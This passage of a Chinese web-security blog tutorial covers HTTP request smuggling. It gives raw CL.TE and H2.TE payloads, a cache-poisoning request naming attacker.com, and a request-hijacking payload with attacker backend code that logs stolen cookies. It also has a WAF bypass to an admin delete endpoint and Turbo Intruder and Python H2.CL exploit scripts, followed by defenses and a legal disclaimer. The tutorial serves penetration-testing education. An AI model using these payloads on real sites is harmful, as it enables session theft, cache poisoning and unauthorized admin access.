+<h2 id="五、实战利用场景"><a href="#五、实战利用场景" class="headerlink" title="五、实战利用场景"></a>五、实战利用场景</h2><h3 id="5-1-缓存投毒（Cache-Poisoning）"><a href="#5-1-缓存投毒（Cache-Poisoning）" class="headerlink" title="5.1 缓存投毒（Cache Poisoning）"></a>5.1 缓存投毒（Cache Poisoning）</h3><p>最经典的利用方式。攻击者走私一个请求，使得CDN&#x2F;代理缓存中将错误的内容与合法URL关联，后续所有请求该URL的用户都会收到投毒后的响应。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>82</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-stylus"><span class="number">0</span>\<span class="attribute">r</span>\n</span></span><br><span class="line"><span class="language-stylus">\<span class="attribute">r</span>\n</span></span><br><span class="line"><span class="language-stylus">GET /index<span class="selector-class">.html</span> HTTP/<span class="number">1.1</span>\<span class="attribute">r</span>\n</span></span><br><span class="line"><span class="language-stylus">Host: attacker.com\<span class="attribute">r</span>\n</span></span><br><span class="line"><span class="language-stylus">X: GET /index<span class="selector-class">.html</span> HTTP/<span class="number">1.1</span>\<span class="attribute">r</span>\n</span></span><br><span class="line"><span class="language-stylus">Host: attacker.com\<span class="attribute">r</span>\n</span></span><br><span class="line"><span class="language-stylus">\<span class="attribute">r</span>\n</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击成功后，CDN可能在缓存 <code>/index.html</code> 时使用了来自 <code>attacker.com</code> 的响应，所有访问首页的用户都会看到攻击者构造的页面。这可能被用于分发恶意JavaScript、钓鱼页面或篡改关键内容。</p>
+<h3 id="5-2-请求劫持（Request-Hijacking）"><a href="#5-2-请求劫持（Request-Hijacking）" class="headerlink" title="5.2 请求劫持（Request Hijacking）"></a>5.2 请求劫持（Request Hijacking）</h3><p>走私攻击可以劫持后续正常用户的请求，将其重定向或窃取其敏感数据。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>60</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-haskell"><span class="number">0</span>\r\n</span></span><br><span class="line"><span class="language-haskell">\r\n</span></span><br><span class="line"><span class="language-haskell"><span class="type">GET</span> /capture?<span class="class"><span class="keyword">data</span>=</span></span></span><br></pre></td></tr></table></figure>
+
+<p>下一个用户的请求（包括其Cookie、Authorization头等）将被拼接到 <code>data=</code> 参数之后，攻击者可以在 <code>/capture</code> 端点记录所有被劫持的会话令牌。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 攻击者后端的伪代码逻辑</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/capture&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// data参数中包含了受害者的完整HTTP请求头</span></span><br><span class="line">    fs.<span class="title function_">appendFileSync</span>(<span class="string">&#x27;stolen_sessions.log&#x27;</span>, req.<span class="property">query</span>.<span class="property">data</span> + <span class="string">&#x27;\n---\n&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-WAF-安全防护绕过"><a href="#5-3-WAF-安全防护绕过" class="headerlink" title="5.3 WAF &#x2F; 安全防护绕过"></a>5.3 WAF &#x2F; 安全防护绕过</h3><p>当WAF部署在代理层时，走私请求可以完全绕过安全检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">攻击者发送的请求（经CDN/WAF检查）：</span><br><span class="line">  POST /safe-endpoint HTTP/1.1</span><br><span class="line">  Content-Length: XX</span><br><span class="line">  TE: chunked</span><br><span class="line">  0\r\n\r\n</span><br><span class="line">  POST /admin/delete-user HTTP/1.1   ← WAF看不到这个请求！</span><br><span class="line">  Host: internal</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">WAF视角：</span><br><span class="line">  &quot;这只是一个对/safe-endpoint的POST请求，没有问题，放行。&quot;</span><br><span class="line"></span><br><span class="line">后端视角：</span><br><span class="line">  请求1: POST /safe-endpoint   → 正常处理</span><br><span class="line">  请求2: POST /admin/delete-user → 绕过WAF，直接执行危险操作</span><br></pre></td></tr></table></figure>
+
+<p>典型的绕过场景包括：</p>
+<ul>
+<li>访问内部管理接口（如 <code>/admin</code>、<code>/actuator</code>、<code>/.env</code>）</li>
+<li>执行恶意文件上传，绕过扩展名校验</li>
+<li>发送SQL注入&#x2F;XSS payload，绕过WAF规则匹配</li>
+<li>SSRF攻击内网服务</li>
+</ul>
+<h2 id="六、Burp-Suite-工具辅助"><a href="#六、Burp-Suite-工具辅助" class="headerlink" title="六、Burp Suite 工具辅助"></a>六、Burp Suite 工具辅助</h2><h3 id="6-1-HTTP-Request-Smuggler-插件"><a href="#6-1-HTTP-Request-Smuggler-插件" class="headerlink" title="6.1 HTTP Request Smuggler 插件"></a>6.1 HTTP Request Smuggler 插件</h3><p>PortSwigger官方发布的Burp Suite扩展——<strong>HTTP Request Smuggler</strong>，可以自动化检测和利用请求走私漏洞。</p>
+<p><strong>主要功能</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│         HTTP Request Smuggler                │</span><br><span class="line">├──────────────────────────────────────────────┤</span><br><span class="line">│  [√] 自动检测 CL.TE / TE.CL / TE.TE 漏洞     │</span><br><span class="line">│  [√] 异步超时技术（Turbo Intruder 集成）      │</span><br><span class="line">│  [√] 一键生成POC验证请求                      │</span><br><span class="line">│  [√] 支持HTTP/2降级走私检测                   │</span><br><span class="line">│  [√] 请求队列污染探测                          │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测核心逻辑</strong>：插件会发送如下探测请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="number">1</span>\<span class="attribute">r</span>\n</span></span><br><span class="line"><span class="language-css">Z\<span class="attribute">r</span>\n</span></span><br><span class="line"><span class="language-css"><span class="selector-tag">Q</span>\<span class="attribute">r</span>\n</span></span><br></pre></td></tr></table></figure>
+
+<p>如果后端因解析到 <code>Q</code> 字符但期望新的请求行而超时或返回异常，则可判定存在走私漏洞。不同时间差异模式（time-based）对应不同的漏洞类型。</p>
+<h3 id="6-2-Turbo-Intruder-高级利用"><a href="#6-2-Turbo-Intruder-高级利用" class="headerlink" title="6.2 Turbo Intruder 高级利用"></a>6.2 Turbo Intruder 高级利用</h3><p>结合Burp Suite的Turbo Intruder，可以以极高的并发速率执行请求走私攻击，放大利用效果。以下是一个针对CL.TE漏洞的Turbo Intruder脚本示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Turbo Intruder script for CL.TE smuggling</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line">    engine = RequestEngine(</span><br><span class="line">        endpoint=target.endpoint,</span><br><span class="line">        concurrentConnections=<span class="number">1</span>,</span><br><span class="line">        requestsPerConnection=<span class="number">100</span>,</span><br><span class="line">        pipeline=<span class="literal">True</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造走私请求</span></span><br><span class="line">    prefix = (</span><br><span class="line">        <span class="string">&quot;POST / HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Host: %s\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Content-Length: 35\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Transfer-Encoding: chunked\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;0\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;GET /admin HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;X-Ignore: &quot;</span></span><br><span class="line">    ) % target.host</span><br><span class="line"></span><br><span class="line">    engine.queue(prefix, gate=<span class="string">&#x27;attack&#x27;</span>)</span><br><span class="line">    engine.openGate(<span class="string">&#x27;attack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送大量后续请求，其中第一个会被拼接</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        engine.queue(target.req)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    table.add(req)</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、HTTP-2-降级走私"><a href="#七、HTTP-2-降级走私" class="headerlink" title="七、HTTP&#x2F;2 降级走私"></a>七、HTTP&#x2F;2 降级走私</h2><h3 id="7-1-为什么-HTTP-2-会带来新的走私风险"><a href="#7-1-为什么-HTTP-2-会带来新的走私风险" class="headerlink" title="7.1 为什么 HTTP&#x2F;2 会带来新的走私风险"></a>7.1 为什么 HTTP&#x2F;2 会带来新的走私风险</h3><p>HTTP&#x2F;2协议本身消除了HTTP&#x2F;1.1中的请求走私问题——它使用二进制帧（binary framing）而非文本协议，不存在Content-Length和Transfer-Encoding的歧义。然而，现实世界中大量系统采用以下架构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端 ──HTTP/2──▶ CDN/代理 ──HTTP/1.1──▶ 后端服务器</span><br></pre></td></tr></table></figure>
+
+<p><strong>降级（Downgrade）过程</strong>：代理接收到HTTP&#x2F;2请求后，将其转换为HTTP&#x2F;1.1请求转发给后端。如果转换过程中引入了歧义，新的走私机会就产生了。</p>
+<h3 id="7-2-H2-CL-走私"><a href="#7-2-H2-CL-走私" class="headerlink" title="7.2 H2.CL 走私"></a>7.2 H2.CL 走私</h3><p>攻击者利用HTTP&#x2F;2请求中的 <code>content-length</code> 伪头部（pseudo-header），在降级到HTTP&#x2F;1.1时操纵Content-Length值。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> h2.connection</span><br><span class="line"><span class="keyword">import</span> h2.events</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">h2_cl_smuggle</span>(<span class="params">target_host, target_port=<span class="number">443</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;HTTP/2降级走私：H2.CL 攻击演示&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    ctx.set_alpn_protocols([<span class="string">&#x27;h2&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    sock = socket.create_connection((target_host, target_port))</span><br><span class="line">    tls_sock = ctx.wrap_socket(sock, server_hostname=target_host)</span><br><span class="line"></span><br><span class="line">    conn = h2.connection.H2Connection()</span><br><span class="line">    conn.initiate_connection()</span><br><span class="line">    tls_sock.sendall(conn.data_to_send())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造走私请求：HTTP/2 content-length头部被降级为HTTP/1.1头</span></span><br><span class="line">    headers = [</span><br><span class="line">        (<span class="string">&#x27;:method&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;:path&#x27;</span>, <span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;:authority&#x27;</span>, target_host),</span><br><span class="line">        (<span class="string">&#x27;content-length&#x27;</span>, <span class="string">&#x27;0&#x27;</span>),         <span class="comment"># HTTP/2中这是普通头部</span></span><br><span class="line">        (<span class="string">&#x27;transfer-encoding&#x27;</span>, <span class="string">&#x27;chunked&#x27;</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    conn.send_headers(<span class="number">1</span>, headers, end_stream=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 降级后，后端的请求体变为：</span></span><br><span class="line">    <span class="comment"># GET /admin HTTP/1.1\r\n</span></span><br><span class="line">    <span class="comment"># Host: internal\r\n</span></span><br><span class="line">    <span class="comment"># \r\n</span></span><br><span class="line">    poison = (</span><br><span class="line">        <span class="string">b&quot;GET /admin HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">b&quot;Host: localhost\r\n&quot;</span></span><br><span class="line">        <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">    )</span><br><span class="line">    conn.send_data(<span class="number">1</span>, poison, end_stream=<span class="literal">True</span>)</span><br><span class="line">    tls_sock.sendall(conn.data_to_send())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] H2.CL smuggling payload sent&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键点</strong>：在HTTP&#x2F;2中，<code>content-length</code> 只是一个普通的头部（header），不是伪头部。但降级代理可能将其映射为HTTP&#x2F;1.1的 <code>Content-Length</code> 头并优先使用，从而覆盖实际的请求体长度，造成走私。</p>
+<h3 id="7-3-H2-TE-走私"><a href="#7-3-H2-TE-走私" class="headerlink" title="7.3 H2.TE 走私"></a>7.3 H2.TE 走私</h3><p>类似地，HTTP&#x2F;2请求中的 <code>transfer-encoding</code> 头在降级时可能被注入到HTTP&#x2F;1.1请求中。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># HTTP/2 原始头部</span><br><span class="line">:method: POST</span><br><span class="line">:path: /</span><br><span class="line">:authority: target.com</span><br><span class="line"><span class="attribute">transfer-encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"># 降级到HTTP/1.1后（代理添加了自己的CL）</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>50           ← 代理根据HTTP/2 DATA帧计算</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked   ← 降级时保留了攻击者注入的头</span><br><span class="line"></span><br><span class="line"><span class="language-livescript"><span class="number">0</span><span class="string">\r\n</span></span></span><br><span class="line"><span class="language-livescript"><span class="string">\r\n</span></span></span><br><span class="line"><span class="language-livescript">GET /smuggled HTTP/<span class="number">1.1</span><span class="string">\r\n</span></span></span><br><span class="line"><span class="language-livescript">Host: internal<span class="string">\r\n</span></span></span><br><span class="line"><span class="language-livescript"><span class="string">\r\n</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="八、防御措施"><a href="#八、防御措施" class="headerlink" title="八、防御措施"></a>八、防御措施</h2><h3 id="8-1-架构层面"><a href="#8-1-架构层面" class="headerlink" title="8.1 架构层面"></a>8.1 架构层面</h3><ul>
+<li><strong>端到端HTTP&#x2F;2</strong>：尽可能使用HTTP&#x2F;2贯穿整个链路，避免降级转换。</li>
+<li><strong>后端也使用HTTP&#x2F;2</strong>：彻底消除协议转换带来的歧义。</li>
+<li><strong>统一解析器</strong>：确保前后端使用相同的HTTP解析库，或在代理层完成解析后以内部格式传递。</li>
+</ul>
+<h3 id="8-2-配置层面"><a href="#8-2-配置层面" class="headerlink" title="8.2 配置层面"></a>8.2 配置层面</h3><ul>
+<li><strong>拒绝歧义请求</strong>：配置前端代理在请求同时包含 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 时直接返回400。</li>
+<li><strong>规范化头部</strong>：去除重复、畸形或无效的Transfer-Encoding头。</li>
+<li><strong>严格的RFC合规</strong>：确保所有HTTP解析严格遵循RFC 7230-7235。</li>
+</ul>
+<h3 id="8-3-检测与监控"><a href="#8-3-检测与监控" class="headerlink" title="8.3 检测与监控"></a>8.3 检测与监控</h3><ul>
+<li><strong>定期扫描</strong>：使用Burp Suite Scanner、HTTP Request Smuggler等工具进行自动化检测。</li>
+<li><strong>流量监控</strong>：关注异常请求模式，如同一连接上出现多个独立请求行。</li>
+<li><strong>WAF规则更新</strong>：启用现代WAF中针对请求走私的检测规则。</li>
+</ul>
+<h2 id="九、总结"><a href="#九、总结" class="headerlink" title="九、总结"></a>九、总结</h2><p>HTTP请求走私攻击是一个”古老但常新”的安全问题。尽管RFC标准早已明确，但工程实现中的妥协和兼容性设计让这些漏洞存在了二十余年，且在新协议（HTTP&#x2F;2、HTTP&#x2F;3）的引入过程中不断催生新的攻击面。</p>
+<p>对于渗透测试工程师而言，理解并掌握请求走私技术是深入Web安全领域的必经之路。从经典的CL.TE&#x2F;TE.CL到如今的HTTP&#x2F;2降级走私，攻击手法在演进，但核心思想始终如一：<strong>在系统的缝隙中寻找不一致，在协议的模糊处注入恶意</strong>。</p>
+<blockquote>
+<p><strong>免责声明</strong>：本文所述技术仅供安全研究、攻防演练和渗透测试授权范围内使用。未经授权的攻击行为违反《中华人民共和国网络安全法》及其他相关法律法规，作者不对任何滥用行为承担责任。请始终在获得明确书面授权的前提下进行安全测试。</p>
+</blockquote>
+<hr>
+<p><em>参考资料</em>  </p>
+<ul>
+<li>PortSwigger Research: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">HTTP Request Smuggling</a>  </li>
+<li>RFC 7230: Hypertext Transfer Protocol (HTTP&#x2F;1.1): Message Syntax and Routing  </li>
+<li>James Kettle: <a target="_blank" rel="noopener" href="https://portswigger.net/research/http2">HTTP&#x2F;2: The Sequel is Always Worse</a>  </li>
+<li>OWASP: <a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/HTTP_Request_Smuggling">HTTP Request Smuggling</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/CMS-common-vulnerabilities/" rel="prev" title="常见CMS漏洞挖掘思路">
+                  <i class="fa fa-angle-left"></i> 常见CMS漏洞挖掘思路
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Deserialization-python-node/" rel="next" title="Python与Node.js反序列化漏洞">
+                  Python与Node.js反序列化漏洞 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
